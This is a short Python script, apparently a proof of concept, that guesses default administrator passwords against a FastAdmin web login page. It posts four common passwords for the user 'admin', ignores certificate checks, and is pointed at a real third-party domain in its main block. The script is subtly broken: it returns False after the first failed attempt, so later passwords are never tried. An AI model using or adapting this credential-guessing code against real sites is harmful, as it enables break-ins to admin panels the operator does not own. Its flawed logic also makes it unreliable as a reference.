#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# fastadmin weak attack
import sys
import json
import warnings
import time
import requests
from urllib.parse import urlparse
post_headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "123456"
}
get_headers ={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
}
def poc(url):
    url_path=url+'/admin/index/login.html'
    passwd=["123456","admin","admin123","admin123456"]
    for password in passwd:
        post_data={
            "username":"admin",
            "password":password
        }
        try:
            req=requests.post(url=url_path,data=post_data,headers=post_headers,timeout=5, verify=False)
            if req.status_code==200 and "登录成功" in req.text:
                return True
            else:
                return False
        except Exception as e:
            return False

if __name__ == '__main__':
    print(poc("https://www.baidu.com"))